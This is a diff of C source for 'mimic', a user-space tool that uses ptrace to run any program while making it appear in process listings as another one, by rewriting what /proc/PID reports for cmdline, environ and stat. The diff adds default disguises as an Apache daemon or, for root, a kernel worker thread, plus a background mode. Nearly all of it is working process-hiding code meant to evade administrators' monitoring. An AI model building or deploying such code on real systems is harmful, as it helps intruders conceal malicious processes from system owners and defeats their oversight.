@@ -4,7 +4,7 @@
  *	mimic
  *
  *
- *	emptymonkey's tool for covert process execution. 
+ *	emptymonkey's tool for covert daemon execution. 
  *		Liar, liar, /proc on fire!
  *
  *
@@ -13,7 +13,7 @@
  *
  *	This tool runs in user-space and requires *no* elevated privileges. 
  *
- *	This tool allows a user to run any daemon style program and have it appear in the process listings as any other
+ *	This tool allows a user to run any program and have it appear in the process listings as any other
  *	program. It works by altering the internal process structures in a way to confuse the /proc/PID filesystem. Tools
  *	that report process details gather that information from the /proc/PID entry for that process.
  *
@@ -23,14 +23,11 @@
  *				believe it's own deception.
  *		* Alter /proc/PID/cmdline to report as the mimic cmdline would.
  *		* Alter /proc/PID/environ to report as the mimic envp would.
- *				(Note, the libc extern **environ is not yet supported. Working on it.)
  *		* Alter /proc/PID/stat to report as the mimic stat would.
  *
  *	To Do:
- *		* Fix the libc extern **environ reference.
  *		* Add /proc/PID/exe support (though this will likely only be usable as root.)
  *		* Add support for remapping the internal memory of the process so that /proc/PID/maps is of no help.
- *		* Examine full_name vs short_name in /proc/PID/stat and others.
  *
  **********************************************************************************************************************/
 
@@ -40,6 +37,7 @@
 
 #include <errno.h>
 #include <error.h>
+#include <limits.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -53,11 +51,11 @@
 #include "libptrace_do.h"
 
 
+#define DEFAULT_MIMIC "/usr/sbin/apache2 -k start"
+#define DEFAULT_ROOT_MIMIC "[kworker/0:0]"
 
-// This is arbitrary. Rather than a hard limit for the number of arguments in the environment, there is
-// a limit on the overall bit size for both the enviroment and command line arguments combined.
-#define ENVP_SIZE 1024
-
+#define SOH_CHAR	0x01
+#define NULL_CHAR	0x00
 
 
 char **wordexp_t_to_vector(wordexp_t *wordexp_t_in);
@@ -69,13 +67,20 @@ int get_vector_byte_count(char **argv);
 
 void usage(){
 
-	fprintf(stderr, "usage: %s -e EXECUTE -m MIMIC [-w] [-a KEY=VALUE]\n", program_invocation_short_name);
-	fprintf(stderr, "\t-e\tCommand to EXECUTE.\n");
-	fprintf(stderr, "\t-m\tCommand to MIMIC.\n");
-	fprintf(stderr, "\t-w\tWipe mimic environment.\n");
-	fprintf(stderr, "\t\t\tThe default is to copy the execute environment verbatim, with the exception of the '_' KEY.\n");
-	fprintf(stderr, "\t-a\tAdd KEY to the mimic environment with associated VALUE.\n");
-	fprintf(stderr, "\t\t\tThis will override an existing KEY. Intended to be invoked multiple times for multiple KEYs.\n");
+	fprintf(stderr, "usage: %s -e COMMAND [-m MIMIC] [-b] [-a KEY=VALUE] [-h]\n", program_invocation_short_name);
+	fprintf(stderr, "\t-e\tExecute COMMAND.\n");
+	fprintf(stderr, "\t-m\tSetup COMMAND to look like MIMIC.\n");
+	fprintf(stderr, "\t\t\tDefault for non-root is:\t\"%s\"\n", DEFAULT_MIMIC);
+	fprintf(stderr, "\t\t\tDefault for root is:\t\t\"%s\"\n", DEFAULT_ROOT_MIMIC);
+	fprintf(stderr, "\t-b\tLaunch COMMAND in the background.\n");
+	fprintf(stderr, "\t-a\tAdd / overwrite KEY to the mimic environment with associated VALUE.\n");
+	fprintf(stderr, "\t-h\tPrint this helpful message.\n");
+	fprintf(stderr, "\n\tNotes:\n");
+	fprintf(stderr, "\t\tThe MIMIC environment will be a copy of the COMMAND environment.\n");
+	fprintf(stderr, "\t\tThe '_' variable is automatically changed.\n");
+	fprintf(stderr, "\t\tThe -a flag can be called multiple times to add / overwrite multiple variables.\n");
+	// XXX Add examples.
+	fprintf(stderr, "\n\tExamples:\n");
 
 	exit(-1);
 }
@@ -122,7 +127,8 @@ int main(int argc, char **argv, char **envp){
 	char *execute_string = NULL, *mimic_string = NULL;
 	wordexp_t execute_wordexp_t, mimic_wordexp_t;
 	char **execute_argv, **mimic_argv;
-	char *mimic_envp[ENVP_SIZE];
+	int execute_argc, mimic_argc;
+	char **mimic_envp;
 	int mimic_envc = 0;
 
 	int child_pid;
@@ -130,6 +136,10 @@ int main(int argc, char **argv, char **envp){
 
 	char **execution_header_local;
 	void *execution_header_remote;
+
+	char **local_buffer;
+	void *remote_buffer;
+
 	unsigned int execution_header_size;
 
 	char *tmp_string_ptr;
@@ -141,11 +151,72 @@ int main(int argc, char **argv, char **envp){
 	long ret_long;
 
 	struct user_regs_struct test_regs;
-	int wipe = 0;
+
+	int background = 0;
+
+	int self_exec = 0;
+
+	int tmp_size;
+
+	char **foreground_mimic_argv;
+	char soh_string[2];
+
+	char *mimic_short_name;
+
+
+	if(argv){
+		i = 0;
+		while(argv[i]){
+			if(argv[i][0] == SOH_CHAR){
+				self_exec = 1;
+				argv[i][0] = NULL_CHAR;
+				break;
+			}
+			i++;
+		}
+	}
+
+	if(self_exec){
+		memset(&argc, i, 1);	
+
+		if((retval = prctl(PR_SET_NAME, argv[i + 1], NULL, NULL, NULL)) == -1){
+			fprintf(stderr, "prctl(PR_SET_NAME, %lx, NULL, NULL, NULL): %s\n", \
+					(unsigned long) argv[i + 1], strerror(errno));
+			exit(-1);
+		}
+		wait(NULL);
+		exit(0);
+	}
 
 
 
-	while ((opt = getopt(argc, argv, "e:m:wn:")) != -1) {
+	// The max size needed of the new env buffer will be:
+	//  * size of current env
+	//  * plus the size of the max '_' variable (which is PATH_MAX + 3)
+	//	* plus the strlen's of the various added environment variables.
+	tmp_size = get_vector_byte_count(envp);
+	tmp_size += PATH_MAX + 3;
+
+	opterr = 0;
+	while ((opt = getopt(argc, argv, "e:m:wa:bh")) != -1) {
+		switch (opt) {
+			case 'a':
+				tmp_size += strlen(optarg) + 1;
+		}
+	}
+
+
+	if((mimic_envp = (char **) calloc(tmp_size, sizeof(char))) == NULL){
+		fprintf(stderr, "calloc(%d, %d): %s\n", tmp_size, (int) sizeof(char), strerror(errno));
+		exit(-1);
+	}
+
+
+	// Now reset and actually handle the options.
+	optind = 1;
+	opterr = 1;
+	while ((opt = getopt(argc, argv, "e:m:wa:bh")) != -1) {
+
 		switch (opt) {
 			case 'e':
 				execute_string = optarg;
@@ -155,26 +226,34 @@ int main(int argc, char **argv, char **envp){
 				mimic_string = optarg;
 				break;
 
-			case 'w':
-				wipe = 1;
+			case 'b':
+				background = 1;
 				break;
 
-			case 'n':
+			case 'a':
 				if(!key_match(mimic_envp, optarg)){
 					mimic_envp[mimic_envc++] = optarg;
 				}
 				break;
 
+			case 'h':
 			default:
 				usage();
 		}
 	}
 
 
-	if((argc - optind) || !execute_string || !mimic_string){
+	if((argc - optind) || !execute_string){
 		usage();
 	}
 
+	if(!mimic_string){
+		if(!getuid()){
+			mimic_string = DEFAULT_ROOT_MIMIC;
+		}else{
+			mimic_string = DEFAULT_MIMIC;
+		}
+	}
 
 	if(wordexp(execute_string, &execute_wordexp_t, 0)){
 		error(-1, errno, "wordexp(%s, %lx, 0)", execute_string, (unsigned long) &execute_wordexp_t);
@@ -183,6 +262,7 @@ int main(int argc, char **argv, char **envp){
 	if((execute_argv = wordexp_t_to_vector(&execute_wordexp_t)) == NULL){
 		error(-1, errno, "wordexp_t_to_vector(%lx)", (unsigned long) &execute_wordexp_t);
 	}
+	execute_argc = execute_wordexp_t.we_wordc;
 
 	if(wordexp(mimic_string, &mimic_wordexp_t, 0)){
 		error(-1, errno, "wordexp(%s, %lx, 0)", mimic_string, (unsigned long) &mimic_wordexp_t);
@@ -191,39 +271,29 @@ int main(int argc, char **argv, char **envp){
 	if((mimic_argv = wordexp_t_to_vector(&mimic_wordexp_t)) == NULL){
 		error(-1, errno, "wordexp_t_to_vector(%lx)", (unsigned long) &mimic_wordexp_t);
 	}
+	mimic_argc = mimic_wordexp_t.we_wordc;
 
 
-	if(!wipe){
-		if(envp){
-			i = 0;
-			while(envp[i]){
-				if(!key_match(mimic_envp, envp[i])){
-					if(!strncmp(envp[i], "_=", 2)){
-						tmp_string_ptr = (char *) calloc(strlen(mimic_argv[0]) + 3, sizeof(char));
-						tmp_string_ptr[0] = '_';
-						tmp_string_ptr[1] = '=';
-						memcpy(tmp_string_ptr + 2, mimic_argv[0], strlen(mimic_argv[0]));
-						mimic_envp[mimic_envc++] = tmp_string_ptr;
-
-					}else{
-						mimic_envp[mimic_envc++] = envp[i];
-					}
-				}
-				i++;
-			}
-		}
+	if((mimic_short_name = strrchr(mimic_argv[0], '/')) == NULL){
+		mimic_short_name = mimic_argv[0];
+	}else{
+		mimic_short_name++;
 	}
 
 	if(envp){
 		i = 0;
 		while(envp[i]){
-			if(!strncmp(envp[i], "_=", 2)){
-				tmp_string_ptr = (char *) calloc(strlen(execute_argv[0]) + 3, sizeof(char));
-				tmp_string_ptr[0] = '_';
-				tmp_string_ptr[1] = '=';
-				memcpy(tmp_string_ptr + 2, execute_argv[0], strlen(execute_argv[0]));
-				envp[i] = tmp_string_ptr;
-				break;
+			if(!key_match(mimic_envp, envp[i])){
+				if(!strncmp(envp[i], "_=", 2)){
+					tmp_string_ptr = (char *) calloc(strlen(mimic_argv[0]) + 3, sizeof(char));
+					tmp_string_ptr[0] = '_';
+					tmp_string_ptr[1] = '=';
+					memcpy(tmp_string_ptr + 2, mimic_argv[0], strlen(mimic_argv[0]));
+					mimic_envp[mimic_envc++] = tmp_string_ptr;
+
+				}else{
+					mimic_envp[mimic_envc++] = envp[i];
+				}
 			}
 			i++;
 		}
@@ -269,23 +339,21 @@ int main(int argc, char **argv, char **envp){
 		argv_stack_val = child->saved_regs.rsp + 0x8;
 		envp_stack_val = argv_stack_val + ((argc_stack_val + 1) * 0x8);
 
-		errno = 0;
-		peektext = ptrace(PTRACE_PEEKTEXT, child->pid, argv_stack_val, NULL);
-		if(errno){
-			fprintf(stderr, "ptrace(PTRACE_PEEKTEXT, %d, %lx, NULL): %s\n", \
-					child->pid, argv_stack_val, \
-					strerror(errno));
-			goto CLEAN_UP;
-		}
 		printf("\t\tSuccess!\n");
 
 
+		// XXX add error checking here.
 		printf("Politely requesting name change...");
+		local_buffer = ptrace_do_malloc(child, strlen(mimic_short_name) + 1);
+		memset(local_buffer, 0, strlen(mimic_short_name) + 1);
+		memcpy(local_buffer, mimic_short_name, strlen(mimic_short_name));
+		remote_buffer = ptrace_do_push_mem(child, local_buffer);
+
 		errno = 0;
-		ret_long = ptrace_do_syscall(child, __NR_prctl, PR_SET_NAME, peektext, 0, 0, 0, 0);
+		ret_long = ptrace_do_syscall(child, __NR_prctl, PR_SET_NAME, (unsigned long) remote_buffer, 0, 0, 0, 0);
 		if(errno){
 			fprintf(stderr, "ptrace_do_syscall(%lx, __NR_prctl, PR_SET_NAME, %lx, 0, 0, 0, 0): %s\n", \
-					(unsigned long) child, peektext, \
+					(unsigned long) child, (unsigned long) remote_buffer, \
 					strerror(errno));
 			goto CLEAN_UP;
 		}
@@ -337,14 +405,14 @@ int main(int argc, char **argv, char **envp){
 		printf("Building execution headers...");
 		memcpy(&(child->saved_regs), &test_regs, sizeof(struct user_regs_struct));
 
-		execution_header_size = sizeof(unsigned long);
-		execution_header_size += get_vector_byte_count(argv);
+		//		execution_header_size = sizeof(unsigned long);
+		execution_header_size = get_vector_byte_count(argv);
 		execution_header_size += get_vector_byte_count(envp);
 		execution_header_size += 2 * sizeof(unsigned long);
 
 		if((execution_header_local = (char **) ptrace_do_malloc(child, execution_header_size)) == NULL){
 			fprintf(stderr, "ptrace_do_malloc(%lx, %d): %s\n", \
-					(unsigned long) child, (int) ((execute_wordexp_t.we_wordc * sizeof(char **)) + 1), \
+					(unsigned long) child, (int) ((execute_argc * sizeof(char **)) + 1), \
 					strerror(errno));
 			goto CLEAN_UP;
 		}
@@ -370,19 +438,39 @@ int main(int argc, char **argv, char **envp){
 		printf("\t\tSuccess!\n");
 
 
-		// XXX At main()'s entry point, $rax will contain the pointer to libc environ variable.
-
-
 		printf("Setting up state...");
-		child->saved_regs.rdi = execute_wordexp_t.we_wordc;
+		child->saved_regs.rdi = execute_argc;
 		child->saved_regs.rsi = (unsigned long) execution_header_remote;
-		child->saved_regs.rdx = (unsigned long) execution_header_remote + ((execute_wordexp_t.we_wordc + 1) * sizeof(char **));
+		child->saved_regs.rdx = (unsigned long) execution_header_remote + ((execute_argc + 1) * sizeof(char **));
 		printf("\t\t\tSuccess!\n");
 
 		printf("\n\tGood-bye and have a good luck! :)\n\n");
 
 CLEAN_UP:
 		ptrace_do_cleanup(child);
+
+		if(!background){
+
+			soh_string[0] = SOH_CHAR;
+			soh_string[1] = NULL_CHAR;
+
+			if((foreground_mimic_argv = (char **) calloc(mimic_argc + 3, sizeof(char **))) == NULL){
+				fprintf(stderr, "calloc(%d, %d): %s\n", \
+						tmp_size, (int) sizeof(char), strerror(errno));
+				exit(-1);
+			}
+
+			i = 0;
+			while(mimic_argv[i]){
+				foreground_mimic_argv[i] = mimic_argv[i];
+				i++;
+			}
+			foreground_mimic_argv[i++] = soh_string;
+			foreground_mimic_argv[i] = mimic_short_name;
+
+			execve(argv[0], foreground_mimic_argv, mimic_envp);
+		}
+
 		return(0);
 
 	}else{
@@ -392,8 +480,8 @@ CLEAN_UP:
 			error(-1, errno, "ptrace(PTRACE_TRACEME, 0, NULL, NULL)");
 		}
 
-		execve(execute_wordexp_t.we_wordv[0], mimic_argv, mimic_envp);
-		error(-1, errno, "execve(%s, %lx, NULL)", execute_wordexp_t.we_wordv[0], (unsigned long) mimic_argv);
+		execve(execute_argv[0], mimic_argv, mimic_envp);
+		error(-1, errno, "execve(%s, %lx, NULL)", execute_argv[0], (unsigned long) mimic_argv);
 	}
 
 	return(-1);
@@ -443,8 +531,16 @@ void build_execution_headers(void *local_buffer, void *base_addr, char **argv, c
 		while(envp[envc++]){}
 	}
 
-	pointer_ptr = (char **) local_buffer;
 	tmp_len = (argc * sizeof(char *)) + (envc * sizeof(char *)) + (2 * sizeof(char *));
+	/*
+		 printf("DEBUG: beh: tmp_len: %d\n", tmp_len);
+		 printf("DEBUG: beh: local_buffer: %lx\n", (unsigned long) local_buffer);
+		 printf("DEBUG: beh: base_addr: %lx\n", (unsigned long) base_addr);
+		 printf("DEBUG: beh: argv: %lx\n", (unsigned long) argv);
+		 printf("DEBUG: beh: envp: %lx\n", (unsigned long) envp);
+	 */
+
+	pointer_ptr = (char **) local_buffer;
 	tmp_ptr_local = local_buffer + tmp_len;
 	tmp_ptr_remote = base_addr + tmp_len;
 
@@ -476,7 +572,6 @@ void build_execution_headers(void *local_buffer, void *base_addr, char **argv, c
 			i++;
 		}
 	}	
-
 }
 
 
@@ -493,3 +588,5 @@ int get_vector_byte_count(char **argv){
 
 	return( ((i + 1) * sizeof(void *)) + total_strlen + (i * sizeof(char)) );
 }
+
+
